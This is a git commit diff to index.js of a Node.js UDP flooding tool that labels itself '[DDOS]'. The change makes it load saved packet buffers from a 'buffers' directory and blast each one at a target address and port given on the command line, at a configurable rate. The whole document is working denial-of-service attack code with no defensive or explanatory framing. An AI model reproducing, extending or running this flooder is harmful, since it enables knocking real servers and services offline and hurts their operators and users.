95f08b05d169d160e0d57e2c8e4abf8d0f78c880
LearXD <gutyxdcanal@gmail.com>
2022-07-07 09:09:53 -0300

    Batch update

--- index.js
+++ index.js
@@ -1,14 +1,27 @@
 const dgram = require('dgram');
+const { fstat } = require('fs');
 const client = dgram.createSocket('udp4');
+
+const fs = require('fs');
+const path = require('path');
 
 const args = process.argv;
 
-const address = args[2] 
+const address = args[2]
 const port = args[3]
 
 const times = args[4] ?? 1000
 
-if(!address || !port)
+const buffersPath = path.join(__dirname, 'buffers');
+let buffers = [];
+
+fs.readdirSync(buffersPath).forEach((file) => {
+  buffers.push(
+    Buffer.from(JSON.parse(fs.readFileSync(path.join(buffersPath, file)))['buffer'])
+  )
+})
+
+if (!address || !port)
   return console.log('[ERROR] Use: \'node . <address> <port> [<times>]\'')
 
 client.on('error', (e) => {
@@ -17,7 +30,10 @@ client.on('error', (e) => {
 })
 
 setInterval(() => {
-    client.send('', 0, 0, port, address);
-    console.log(`[DDOS] Sending packets to ${address}:${port}...`)
+  buffers.forEach((buffer) => {
+    client.send(buffer ?? '', port, address);
+  })
+
+  console.log(`[DDOS] Sending packets to ${address}:${port}...`)
 }, (1000 / (times <= 0 ? 1000 : times)))
-    
+
